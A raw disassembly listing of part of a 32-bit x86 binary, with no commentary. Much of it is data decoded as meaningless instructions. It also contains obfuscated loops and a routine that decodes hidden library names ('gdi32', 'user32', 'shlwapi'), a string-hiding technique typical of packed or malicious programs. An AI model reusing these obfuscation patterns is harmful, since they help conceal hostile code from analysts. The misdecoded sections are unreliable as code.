  41c7e9:	cmp    al,0x55
  41c7eb:	sub    dh,0xa8
  41c7ee:	xchg   esi,eax
  41c7ef:	test   dl,ch
  41c7f1:	mov    esi,edi
  41c7f3:	push   ebx
  41c7f4:	xlat   BYTE PTR ds:[ebx]
  41c7f5:	inc    ebp
  41c7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7f7:	int3   
  41c7f8:	sub    ecx,DWORD PTR [edx]
  41c7fa:	in     al,dx
  41c7fb:	fadd   QWORD PTR [edi+0x304b79e5]
  41c801:	retf   0xee4d
  41c804:	jge    0x41c800
  41c806:	mov    ds:0x2c27a641,al
  41c80b:	cmp    ecx,esi
  41c80d:	adc    esp,DWORD PTR [eax]
  41c80f:	adc    al,0x6b
  41c811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c812:	add    cl,BYTE PTR [esi-0x2f8f5b62]
  41c818:	out    dx,al
  41c819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c81a:	pop    eax
  41c81b:	mov    esi,esi
  41c81d:	(bad)  
  41c81e:	mov    esi,0x65162d74
  41c823:	(bad)  
  41c824:	add    DWORD PTR [eax+0x317d5ee6],0x18
  41c82b:	mov    ds:0xd86e4c0f,eax
  41c830:	add    eax,0x118ff458
  41c835:	mov    ebp,0x136ea862
  41c83a:	repz jmp 0x41c7c3
  41c83d:	outs   dx,BYTE PTR ds:[esi]
  41c83e:	(bad)  
  41c83f:	fisub  WORD PTR [ebp-0x2]
  41c842:	mov    ah,0x87
  41c844:	mov    DWORD PTR [edx-0x36c4d69d],ebp
  41c84a:	jns    0x41c89f
  41c84c:	or     al,0x52
  41c84e:	and    dh,BYTE PTR [ecx-0x4d]
  41c851:	fdivr  QWORD PTR [edi]
  41c853:	call   0x35bf:0x550f4196
  41c85a:	mov    cl,0x80
  41c85c:	pop    esi
  41c85d:	or     BYTE PTR [ebp+0x18],al
  41c860:	inc    edx
  41c861:	lds    esi,FWORD PTR [edi]
  41c863:	stos   DWORD PTR es:[edi],eax
  41c864:	or     eax,0x740d6603
  41c869:	retf   
  41c86a:	and    bh,BYTE PTR [ebp+0x56a8daea]
  41c870:	xchg   edi,eax
  41c871:	pop    es
  41c872:	push   ecx
  41c873:	dec    ecx
  41c874:	dec    edi
  41c875:	sbb    bl,BYTE PTR [edx]
  41c877:	push   edi
  41c878:	sub    al,0x13
  41c87a:	or     DWORD PTR [esi+0x4c2e3c22],edx
  41c880:	pop    ebx
  41c881:	gs int3 
  41c883:	sub    al,0x2d
  41c885:	dec    ecx
  41c886:	into   
  41c887:	xchg   ebp,eax
  41c888:	call   DWORD PTR [esi-0x7a037e7e]
  41c88e:	popf   
  41c88f:	or     bh,dh
  41c891:	pop    ebp
  41c892:	pop    ds
  41c893:	xchg   esp,eax
  41c894:	jmp    0x41c866
  41c896:	mov    bh,0x59
  41c898:	and    al,0xd7
  41c89a:	aas    
  41c89b:	xor    eax,0x74f1beb3
  41c8a0:	push   ds
  41c8a1:	frstor [esi-0x2a]
  41c8a4:	xor    esp,eax
  41c8a6:	pop    ds
  41c8a7:	and    al,0x4e
  41c8a9:	popf   
  41c8aa:	rol    BYTE PTR [ecx+0x12],cl
  41c8ad:	cmp    al,0xa7
  41c8af:	push   0x2f0678aa
  41c8b4:	jle    0x41c87e
  41c8b6:	mov    cl,BYTE PTR [ecx-0x45]
  41c8b9:	jmp    0xc701:0xd6e4eda1
  41c8c0:	pop    ss
  41c8c1:	pop    ebx
  41c8c2:	cwde   
  41c8c3:	scas   eax,DWORD PTR es:[edi]
  41c8c4:	pop    ss
  41c8c5:	and    edi,ebx
  41c8c7:	das    
  41c8c8:	dec    esi
  41c8c9:	cs sub eax,0x8a805ce9
  41c8cf:	int3   
  41c8d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8d1:	or     eax,0x2e36912a
  41c8d6:	mov    bh,0x33
  41c8d8:	(bad)  
  41c8da:	lds    esi,FWORD PTR [edx-0x3b]
  41c8dd:	icebp  
  41c8de:	shl    BYTE PTR [edx-0x5c],cl
  41c8e1:	lock push 0x2bef9890
  41c8e7:	xchg   esi,eax
  41c8e8:	iret   
  41c8e9:	mov    dh,0x2b
  41c8eb:	mov    eax,ebx
  41c8ed:	cmp    BYTE PTR [edi],al
  41c8ef:	fbld   TBYTE PTR [ecx-0x6f]
  41c8f2:	push   ebp
  41c8f3:	mov    ds:0x970bbc67,eax
  41c8f8:	xchg   esp,edi
  41c8fa:	push   eax
  41c8fb:	add    BYTE PTR [eax],bh
  41c8fd:	push   cs
  41c8fe:	mov    ecx,0xbdbc3f38
  41c903:	push   es
  41c904:	pop    edx
  41c905:	dec    ebx
  41c906:	pop    es
  41c907:	rol    eax,0xb2
  41c90a:	inc    ebp
  41c90b:	das    
  41c90c:	xor    eax,esp
  41c90e:	cmp    esp,DWORD PTR [esi-0x63]
  41c911:	addr16 aaa 
  41c913:	int    0xc6
  41c915:	aas    
  41c916:	sti    
  41c917:	add    DWORD PTR [edx+ebp*1],ecx
  41c91a:	pop    edi
  41c91b:	jo     0x41c941
  41c91d:	xlat   BYTE PTR ds:[ebx]
  41c91e:	test   BYTE PTR [ecx+edx*4-0x3bb2307c],cl
  41c925:	(bad)  
  41c926:	mov    ds:0xf25587f7,eax
  41c92b:	add    al,0x7f
  41c92d:	pop    esp
  41c92e:	es sahf 
  41c930:	fstp   QWORD PTR [ebx+0x4feb8460]
  41c936:	retf   
  41c937:	mov    ds:0x276a9742,al
  41c93c:	ja     0x41c8c4
  41c93e:	lahf   
  41c93f:	push   ecx
  41c940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c941:	mov    BYTE PTR [edx+edi*4+0x5f8d6a15],cl
  41c948:	or     DWORD PTR [eax+0x5a2575e8],0x127189f9
  41c952:	or     DWORD PTR [edi-0x2a1053b2],esp
  41c958:	je     0x41c921
  41c95a:	xchg   ecx,eax
  41c95b:	lods   al,BYTE PTR ds:[esi]
  41c95c:	outs   dx,BYTE PTR ds:[esi]
  41c95d:	mov    WORD PTR [edx],ss
  41c95f:	stos   BYTE PTR es:[edi],al
  41c960:	pop    es
  41c961:	mov    eax,ds:0xfc7ec387
  41c966:	adc    DWORD PTR [edx-0x47256c64],esp
  41c96c:	jg     0x41c98d
  41c96e:	js     0x41c93c
  41c970:	outs   dx,BYTE PTR ds:[esi]
  41c971:	dec    ecx
  41c972:	jne    0x41c95e
  41c974:	shr    ch,cl
  41c976:	dec    eax
  41c977:	aas    
  41c978:	sbb    BYTE PTR [ebx+ebx*8],0x80
  41c97c:	(bad)  [eax]
  41c97e:	push   eax
  41c97f:	sbb    BYTE PTR [edi+ebp*2-0x20],0x19
  41c984:	arpl   WORD PTR [ebp-0x43996d64],cx
  41c98a:	push   edx
  41c98b:	or     al,0xfc
  41c98d:	cmp    eax,0x9c016645
  41c992:	ret    
  41c993:	sub    al,0xc0
  41c995:	pushf  
  41c996:	nop
  41c997:	imul   ecx,DWORD PTR [ecx],0x2542578d
  41c99d:	or     ah,al
  41c99f:	sbb    al,0x5f
  41c9a1:	sub    bl,BYTE PTR ds:0x230aee1d
  41c9a7:	cmp    al,0x2e
  41c9a9:	or     edi,DWORD PTR [esi-0x4d]
  41c9ac:	lock sub eax,0x9df41e07
  41c9b2:	xchg   esp,eax
  41c9b3:	call   0xcc7:0xca3d8068
  41c9ba:	jne    0x41c98c
  41c9bc:	sub    eax,0xa4b2bcab
  41c9c1:	hlt    
  41c9c2:	rcl    BYTE PTR [edi],0xdb
  41c9c5:	push   ecx
  41c9c6:	push   es
  41c9c7:	mov    ds:0x85005075,eax
  41c9cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9cd:	and    ebp,DWORD PTR [eax-0x11dea831]
  41c9d3:	xor    al,0xb2
  41c9d5:	mov    al,ds:0x274d3cdd
  41c9da:	adc    cl,BYTE PTR [esi+0x55753c19]
  41c9e0:	cmp    eax,0xc050aa33
  41c9e5:	push   eax
  41c9e6:	call   0xa4a0c34
  41c9eb:	jmp    0xbb94a4c1
  41c9f0:	jmp    esp
  41c9f2:	pop    DWORD PTR [ebp+0xb]
  41c9f5:	pop    eax
  41c9f6:	mov    al,ds:0x6e10ed9f
  41c9fb:	shr    esp,cl
  41c9fd:	bound  eax,QWORD PTR [ebx-0x43177b50]
  41ca03:	jns    0x41c9d1
  41ca05:	cld    
  41ca06:	repnz inc ebx
  41ca08:	in     eax,0x39
  41ca0a:	push   ss
  41ca0b:	aam    0x46
  41ca0d:	test   BYTE PTR [eax+0x1e747366],dl
  41ca13:	pop    ebp
  41ca14:	jmp    0xafff9768
  41ca19:	mov    al,ds:0xa2d21695
  41ca1e:	fwait
  41ca1f:	or     DWORD PTR [ebx],0xfffffff0
  41ca22:	push   ebp
  41ca23:	push   0xea150dc2
  41ca28:	jg     0x41ca52
  41ca2a:	into   
  41ca2b:	add    eax,0x37507d7e
  41ca30:	js     0x41c9c1
  41ca32:	jno    0x41ca87
  41ca34:	pop    ebp
  41ca35:	xor    BYTE PTR [edx],bh
  41ca37:	(bad)  
  41ca38:	cmp    eax,0x3baa082
  41ca3d:	inc    ebp
  41ca3e:	xchg   DWORD PTR [eax-0x70786e64],esi
  41ca44:	sub    DWORD PTR [ebx],edi
  41ca46:	dec    esp
  41ca47:	adc    al,0xb2
  41ca49:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41ca4b:	retf   
  41ca4c:	add    BYTE PTR [ebx-0x4356866d],0xeb
  41ca53:	scas   eax,DWORD PTR es:[edi]
  41ca54:	loopne 0x41cab2
  41ca56:	and    ah,BYTE PTR ds:0x18884f6e
  41ca5c:	push   0x16
  41ca5e:	mov    edx,0xabafbac0
  41ca63:	rcr    BYTE PTR [ecx+0x209c1f74],1
  41ca69:	and    al,0x4e
  41ca6b:	push   0x5a6c25ed
  41ca70:	and    cl,0xc5
  41ca73:	cmp    BYTE PTR [ebp-0x618d8f3a],bl
  41ca79:	call   0xbb22:0x2b7d8b94
  41ca80:	add    BYTE PTR [eax+ebx*2+0x64f3afcf],bh
  41ca87:	add    BYTE PTR [ebx-0x30211934],bl
  41ca8d:	std    
  41ca8e:	inc    edx
  41ca8f:	add    ah,BYTE PTR [edi]
  41ca91:	jne    0x41ca60
  41ca93:	and    ch,ch
  41ca95:	fnsave [edx+0x5c19a78]
  41ca9b:	shr    DWORD PTR ds:0xdb16aa96,cl
  41caa1:	cwde   
  41caa2:	push   edx
  41caa3:	push   ebp
  41caa4:	fldenv [ebx+0x60]
  41caa7:	dec    esp
  41caa8:	int3   
  41caa9:	pusha  
  41caaa:	jns    0x41caf2
  41caac:	dec    esp
  41caad:	aad    0x9
  41caaf:	ss jb  0x41ca48
  41cab2:	repz repz xchg bp,ax
  41cab6:	repz inc eax
  41cab8:	ret    0xadc3
  41cabb:	fadd   DWORD PTR [ebx-0x4acd929d]
  41cac1:	std    
  41cac2:	fisttp DWORD PTR [edi+0x5b4948cb]
  41cac8:	push   cs
  41cac9:	sub    esp,DWORD PTR [edx-0x2e05e7c0]
  41cacf:	jae    0x41cab2
  41cad1:	lods   eax,DWORD PTR ds:[esi]
  41cad2:	mov    ebx,0x88b88148
  41cad7:	mov    dh,0xfc
  41cad9:	pop    eax
  41cada:	(bad)  
  41cadb:	mov    WORD PTR [ecx],?
  41cadd:	mov    esi,0xc57895a1
  41cae2:	bound  edi,QWORD PTR [esi-0x13]
  41cae5:	ja     0x41cae6
  41cae7:	lahf   
  41cae8:	push   es
  41cae9:	test   BYTE PTR [ebx+0x9],ah
  41caec:	dec    esi
  41caed:	mov    cs,WORD PTR [edx-0x1886983f]
  41caf3:	pop    es
  41caf4:	out    dx,al
  41caf5:	inc    esi
  41caf6:	retf   0xf355
  41caf9:	inc    edx
  41cafa:	and    esi,DWORD PTR [ebp-0x7611f970]
  41cb00:	(bad)  
  41cb02:	xchg   ah,ch
  41cb04:	loop   0x41cb10
  41cb06:	rol    edx,1
  41cb08:	aas    
  41cb09:	(bad)  
  41cb0a:	out    dx,al
  41cb0b:	cmp    eax,0x658f114d
  41cb10:	push   edx
  41cb11:	(bad)  
  41cb12:	xor    DWORD PTR [ebx+0x3a476b45],eax
  41cb18:	ds lahf 
  41cb1a:	stos   BYTE PTR es:[edi],al
  41cb1b:	and    DWORD PTR [edx],ebp
  41cb1d:	lea    edi,[esi+ebx*8-0x335ee66e]
  41cb24:	call   0x2b92:0xd72bcc71
  41cb2b:	xchg   edx,eax
  41cb2c:	fist   WORD PTR [ebp-0xd]
  41cb2f:	hlt    
  41cb30:	sbb    al,0x99
  41cb32:	add    cl,ah
  41cb34:	sub    DWORD PTR [edx-0x7c],ecx
  41cb37:	je     0x41cb72
  41cb39:	loope  0x41cb5a
  41cb3b:	retf   
  41cb3c:	sbb    dl,BYTE PTR [ecx+0x23]
  41cb3f:	push   edi
  41cb40:	jae    0x41cba9
  41cb42:	test   BYTE PTR [ebx-0x66e027ce],dl
  41cb48:	(bad)  
  41cb49:	pop    ecx
  41cb4a:	mov    ebp,0xeff9f50e
  41cb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb50:	cmp    eax,0xa8f8b22c
  41cb55:	sbb    ebx,ebp
  41cb57:	sar    DWORD PTR [ecx+esi*4+0x7f93c329],1
  41cb5e:	scas   eax,DWORD PTR es:[edi]
  41cb5f:	push   cs
  41cb60:	(bad)  
  41cb61:	gs and edx,ebx
  41cb64:	mov    DWORD PTR [ebp-0x4c],edx
  41cb67:	mov    edx,DWORD PTR [ebp+0x8]
  41cb6a:	mov    ebx,DWORD PTR [ebp-0x48]
  41cb6d:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cb74:	mov    DWORD PTR [ebp-0x48],edx
  41cb77:	mov    edx,DWORD PTR [ebp+0x8]
  41cb7a:	mov    ebx,0xfa5e15e2
  41cb7f:	sub    ebx,edx
  41cb81:	add    ebx,DWORD PTR [ebp-0x44]
  41cb84:	mov    DWORD PTR [ebp-0x44],ebx
  41cb87:	mov    edx,DWORD PTR [ebp+0x8]
  41cb8a:	xor    edx,eax
  41cb8c:	add    edx,esi
  41cb8e:	jne    0x41a7ce
  41cb94:	mov    edx,DWORD PTR [ebp-0x14]
  41cb97:	mov    DWORD PTR [ebp+0x8],edx
  41cb9a:	jmp    0x41cc0f
  41cb9f:	mov    edx,DWORD PTR [ebp+0x8]
  41cba2:	mov    ebx,DWORD PTR [ebp-0x8]
  41cba5:	xor    edx,eax
  41cba7:	xor    ebx,eax
  41cba9:	sub    edx,ebx
  41cbab:	sub    edx,esi
  41cbad:	xor    edx,eax
  41cbaf:	mov    DWORD PTR [ebp+0x8],edx
  41cbb2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbb5:	mov    ebx,DWORD PTR [ebp-0x58]
  41cbb8:	add    edx,0x5708c4
  41cbbe:	imul   edx,ebx
  41cbc1:	mov    DWORD PTR [ebp-0x58],edx
  41cbc4:	mov    edx,DWORD PTR [ebp+0x8]
  41cbc7:	mov    ebx,DWORD PTR [ebp-0x54]
  41cbca:	add    edx,0x64f8da
  41cbd0:	or     edx,ebx
  41cbd2:	mov    DWORD PTR [ebp-0x54],edx
  41cbd5:	mov    edx,DWORD PTR [ebp+0x8]
  41cbd8:	mov    ebx,DWORD PTR [ebp-0x50]
  41cbdb:	add    edx,ecx
  41cbdd:	xor    edx,ebx
  41cbdf:	mov    DWORD PTR [ebp-0x50],edx
  41cbe2:	mov    edx,DWORD PTR [ebp+0x8]
  41cbe5:	mov    ebx,DWORD PTR [ebp-0x4c]
  41cbe8:	add    edx,edi
  41cbea:	and    edx,ebx
  41cbec:	mov    DWORD PTR [ebp-0x4c],edx
  41cbef:	mov    edx,DWORD PTR [ebp+0x8]
  41cbf2:	mov    ebx,DWORD PTR [ebp-0x48]
  41cbf5:	lea    edx,[ebx+edx*1+0x241fc1f]
  41cbfc:	mov    DWORD PTR [ebp-0x48],edx
  41cbff:	mov    edx,DWORD PTR [ebp+0x8]
  41cc02:	mov    ebx,0xfa5e15e2
  41cc07:	sub    ebx,edx
  41cc09:	add    ebx,DWORD PTR [ebp-0x44]
  41cc0c:	mov    DWORD PTR [ebp-0x44],ebx
  41cc0f:	mov    edx,DWORD PTR [ebp+0x8]
  41cc12:	xor    edx,eax
  41cc14:	add    edx,esi
  41cc16:	jne    0x41cb9f
  41cc1c:	mov    edx,DWORD PTR [ebp-0x8]
  41cc1f:	mov    ebx,DWORD PTR [ebp-0xc]
  41cc22:	xor    edx,eax
  41cc24:	lea    edx,[edx+ebx*1+0x3272e2]
  41cc2b:	mov    DWORD PTR [ebp-0xc],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	xor    edx,eax
  41cc33:	add    edx,esi
  41cc35:	jne    0x413baf
  41cc3b:	jmp    0x41cd52
  41cc40:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc43:	mov    DWORD PTR [ebp+0x8],ecx
  41cc46:	jmp    0x41ccbf
  41cc4b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc4e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc51:	xor    ecx,eax
  41cc53:	xor    edx,eax
  41cc55:	sub    ecx,edx
  41cc57:	sub    ecx,esi
  41cc59:	xor    ecx,eax
  41cc5b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc5e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc61:	mov    edx,DWORD PTR [ebp-0x58]
  41cc64:	add    ecx,0x5708c4
  41cc6a:	imul   ecx,edx
  41cc6d:	mov    DWORD PTR [ebp-0x58],ecx
  41cc70:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc73:	mov    edx,DWORD PTR [ebp-0x54]
  41cc76:	add    ecx,0x64f8da
  41cc7c:	or     ecx,edx
  41cc7e:	mov    DWORD PTR [ebp-0x54],ecx
  41cc81:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc84:	mov    edx,DWORD PTR [ebp-0x50]
  41cc87:	add    ecx,0x242ebe9
  41cc8d:	xor    ecx,edx
  41cc8f:	mov    DWORD PTR [ebp-0x50],ecx
  41cc92:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc95:	mov    edx,DWORD PTR [ebp-0x4c]
  41cc98:	add    ecx,edi
  41cc9a:	and    ecx,edx
  41cc9c:	mov    DWORD PTR [ebp-0x4c],ecx
  41cc9f:	mov    ecx,DWORD PTR [ebp+0x8]
  41cca2:	mov    edx,DWORD PTR [ebp-0x48]
  41cca5:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ccac:	mov    DWORD PTR [ebp-0x48],ecx
  41ccaf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccb2:	mov    edx,0xfa5e15e2
  41ccb7:	sub    edx,ecx
  41ccb9:	add    edx,DWORD PTR [ebp-0x44]
  41ccbc:	mov    DWORD PTR [ebp-0x44],edx
  41ccbf:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccc2:	xor    ecx,eax
  41ccc4:	add    ecx,esi
  41ccc6:	jne    0x41cc4b
  41cccc:	jmp    0x41cd5e
  41ccd1:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccd4:	mov    edx,DWORD PTR [ebp-0x8]
  41ccd7:	xor    ecx,eax
  41ccd9:	xor    edx,eax
  41ccdb:	sub    ecx,edx
  41ccdd:	sub    ecx,esi
  41ccdf:	xor    ecx,eax
  41cce1:	mov    DWORD PTR [ebp+0x8],ecx
  41cce4:	mov    ecx,DWORD PTR [ebp+0x8]
  41cce7:	mov    edx,DWORD PTR [ebp-0x58]
  41ccea:	add    ecx,0x5708c4
  41ccf0:	imul   ecx,edx
  41ccf3:	mov    DWORD PTR [ebp-0x58],ecx
  41ccf6:	mov    ecx,DWORD PTR [ebp+0x8]
  41ccf9:	mov    edx,DWORD PTR [ebp-0x54]
  41ccfc:	add    ecx,0x64f8da
  41cd02:	or     ecx,edx
  41cd04:	mov    DWORD PTR [ebp-0x54],ecx
  41cd07:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd0a:	mov    edx,DWORD PTR [ebp-0x50]
  41cd0d:	add    ecx,0x242ebe9
  41cd13:	xor    ecx,edx
  41cd15:	mov    DWORD PTR [ebp-0x50],ecx
  41cd18:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd1b:	mov    edx,DWORD PTR [ebp-0x4c]
  41cd1e:	add    ecx,edi
  41cd20:	and    ecx,edx
  41cd22:	mov    DWORD PTR [ebp-0x4c],ecx
  41cd25:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd28:	mov    edx,DWORD PTR [ebp-0x48]
  41cd2b:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41cd32:	mov    DWORD PTR [ebp-0x48],ecx
  41cd35:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd38:	mov    edx,0xfa5e15e2
  41cd3d:	sub    edx,ecx
  41cd3f:	add    edx,DWORD PTR [ebp-0x44]
  41cd42:	mov    DWORD PTR [ebp-0x44],edx
  41cd45:	mov    ecx,DWORD PTR [ebp+0x8]
  41cd48:	xor    ecx,eax
  41cd4a:	add    ecx,esi
  41cd4c:	jne    0x41ccd1
  41cd52:	mov    ecx,DWORD PTR [ebp-0x8]
  41cd55:	xor    ecx,eax
  41cd57:	mov    eax,DWORD PTR [ebp+0x10]
  41cd5a:	add    ecx,esi
  41cd5c:	mov    DWORD PTR [eax],ecx
  41cd5e:	pop    edi
  41cd5f:	pop    esi
  41cd60:	pop    ebx
  41cd61:	leave  
  41cd62:	ret    0xc
  41cd65:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41cd6b:	inc    edx
  41cd6c:	add    BYTE PTR [eax],cl
  41cd6e:	mov    al,ds:0xa00c0042
  41cd73:	inc    edx
  41cd74:	add    BYTE PTR [eax],dl
  41cd76:	mov    al,ds:0xa0140042
  41cd7b:	inc    edx
  41cd7c:	add    BYTE PTR [eax],bl
  41cd7e:	mov    al,ds:0xa01c0042
  41cd83:	inc    edx
  41cd84:	add    BYTE PTR [eax],al
  41cd86:	rol    BYTE PTR [edx+0x0],1
  41cd89:	add    al,0xd0
  41cd8b:	inc    edx
  41cd8c:	add    BYTE PTR [eax],cl
  41cd8e:	rol    BYTE PTR [edx+0x0],1
  41cd91:	or     al,0xd0
  41cd93:	inc    edx
  41cd94:	add    BYTE PTR [eax],dl
  41cd96:	rol    BYTE PTR [edx+0x0],1
  41cd99:	adc    al,0xd0
  41cd9b:	inc    edx
  41cd9c:	add    BYTE PTR [eax],bl
  41cd9e:	rol    BYTE PTR [edx+0x0],1
  41cda1:	sbb    al,0xd0
  41cda3:	inc    edx
	...
  41cdb4:	rcr    esp,1
  41cdb6:	xor    BYTE PTR [ebp+0x0],cl
  41cdb9:	add    BYTE PTR [eax],al
  41cdbb:	add    BYTE PTR [edx],al
  41cdbd:	add    BYTE PTR [eax],al
  41cdbf:	add    BYTE PTR ds:0x40000000,bh
  41cdc5:	into   
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	inc    eax
  41cdc9:	ret    0x1
  41cdcc:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41cdd2:	inc    edx
  41cdd3:	add    BYTE PTR [eax],cl
  41cdd5:	nop
  41cdd6:	inc    edx
  41cdd7:	add    BYTE PTR [eax+edx*4],cl
  41cdda:	inc    edx
  41cddb:	add    BYTE PTR [eax],dl
  41cddd:	nop
  41cdde:	inc    edx
  41cddf:	add    BYTE PTR [eax+edx*4],dl
  41cde2:	inc    edx
  41cde3:	add    BYTE PTR [eax],bl
  41cde5:	nop
  41cde6:	inc    edx
  41cde7:	add    BYTE PTR [eax+edx*4],bl
  41cdea:	inc    edx
  41cdeb:	add    BYTE PTR [eax],ah
  41cded:	nop
  41cdee:	inc    edx
  41cdef:	add    BYTE PTR [eax+edx*4],ah
  41cdf2:	inc    edx
  41cdf3:	add    BYTE PTR [eax],ch
  41cdf5:	nop
  41cdf6:	inc    edx
  41cdf7:	add    BYTE PTR [eax],al
  41cdf9:	mov    al,0x42
  41cdfb:	add    BYTE PTR [eax+esi*4],al
  41cdfe:	inc    edx
  41cdff:	add    BYTE PTR [eax],cl
  41ce01:	mov    al,0x42
  41ce03:	add    BYTE PTR [eax+esi*4],cl
  41ce06:	inc    edx
  41ce07:	add    BYTE PTR [eax],dl
  41ce09:	mov    al,0x42
  41ce0b:	add    BYTE PTR [eax+esi*4],dl
  41ce0e:	inc    edx
  41ce0f:	add    BYTE PTR [eax],bl
  41ce11:	mov    al,0x42
  41ce13:	add    BYTE PTR [eax+esi*4],bl
  41ce16:	inc    edx
  41ce17:	add    BYTE PTR [eax],al
  41ce19:	rol    BYTE PTR [edx+0x0],0x4
  41ce1d:	rol    BYTE PTR [edx+0x0],0x8
  41ce21:	rol    BYTE PTR [edx+0x0],0xc
  41ce25:	rol    BYTE PTR [edx+0x0],0x10
  41ce29:	rol    BYTE PTR [edx+0x0],0x14
  41ce2d:	rol    BYTE PTR [edx+0x0],0x18
  41ce31:	rol    BYTE PTR [edx+0x0],0x1c
  41ce35:	rol    BYTE PTR [edx+0x0],0x0
  41ce39:	add    BYTE PTR [eax],al
  41ce3b:	add    BYTE PTR [eax],al
  41ce3d:	add    BYTE PTR [eax],al
  41ce3f:	add    BYTE PTR [edx+0x53],dl
  41ce42:	inc    esp
  41ce43:	push   ebx
  41ce44:	stos   WORD PTR es:[edi],ax
  41ce46:	loop   0x41ce27
  41ce48:	out    0xe5,eax
  41ce4a:	test   DWORD PTR [ecx-0x41],0x3dd32fea
  41ce51:	xor    bh,ch
  41ce53:	ret    0x1
  41ce56:	add    BYTE PTR [eax],al
  41ce58:	inc    ebx
  41ce59:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41ce5d:	jb     0x41ced1
  41ce5f:	outs   dx,BYTE PTR gs:[esi]
  41ce61:	je     0x41cea7
  41ce63:	popa   
  41ce64:	je     0x41cec7
  41ce66:	pop    esp
  41ce67:	dec    ebp
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ce71:	ins    BYTE PTR es:[edi],dx
  41ce72:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ce79:	dec    esi
  41ce7a:	gs ja  0x41ce7d
  41ce7d:	mov    edx,DWORD PTR [ebp-0x14]
  41ce80:	sub    esp,0xe4
  41ce86:	push   ebx
  41ce87:	push   edi
  41ce88:	mov    eax,ebx
  41ce8a:	xchg   ecx,eax
  41ce8b:	mov    eax,DWORD PTR [ebp+0x8]
  41ce8e:	mov    edi,0xf89c8585
  41ce93:	cmp    eax,edi
  41ce95:	jne    0x41d21d
  41ce9b:	mov    eax,DWORD PTR [ebp+0xc]
  41ce9e:	cmp    eax,0xf89c8584
  41cea3:	jne    0x41d21d
  41cea9:	mov    eax,DWORD PTR [ebp+0x24]
  41ceac:	mov    DWORD PTR [ebp-0x4],eax
  41ceaf:	mov    BYTE PTR [ebp-0x18],0x1b
  41ceb3:	mov    BYTE PTR [ebp-0x17],0x18
  41ceb7:	mov    BYTE PTR [ebp-0x16],0x5
  41cebb:	mov    BYTE PTR [ebp-0x15],0x4f
  41cebf:	mov    BYTE PTR [ebp-0x14],0x4e
  41cec3:	mov    BYTE PTR [ebp-0x13],0x7c
  41cec7:	mov    BYTE PTR [ebp-0x20],0x9
  41cecb:	mov    BYTE PTR [ebp-0x1f],0xf
  41cecf:	mov    BYTE PTR [ebp-0x1e],0x19
  41ced3:	mov    BYTE PTR [ebp-0x1d],0xe
  41ced7:	mov    BYTE PTR [ebp-0x1c],0x4f
  41cedb:	mov    BYTE PTR [ebp-0x1b],0x4e
  41cedf:	mov    BYTE PTR [ebp-0x1a],0x7c
  41cee3:	mov    BYTE PTR [ebp-0x28],0xf
  41cee7:	mov    BYTE PTR [ebp-0x27],0x4
  41ceeb:	mov    BYTE PTR [ebp-0x26],0x0
  41ceef:	mov    BYTE PTR [ebp-0x25],0xb
  41cef3:	push   esi
  41cef4:	mov    BYTE PTR [ebp-0x24],0x1d
  41cef8:	mov    BYTE PTR [ebp-0x23],0xc
  41cefc:	push   0x74
  41cefe:	mov    BYTE PTR [ebp-0x22],0x5
  41cf02:	mov    BYTE PTR [ebp-0x21],0x7c
  41cf06:	xor    esi,esi
  41cf08:	pop    edx
  41cf09:	mov    eax,0xf8
  41cf0e:	lea    ecx,[ebp+esi*1-0x18]
  41cf12:	movzx  ebx,BYTE PTR [ecx]
  41cf15:	xor    ebx,edx
  41cf17:	add    ebx,eax
  41cf19:	inc    esi
  41cf1a:	mov    BYTE PTR [ecx],bl
  41cf1c:	cmp    esi,0x6
  41cf1f:	jb     0x41cf0e
  41cf21:	xor    esi,esi
  41cf23:	lea    ecx,[ebp+esi*1-0x20]
  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
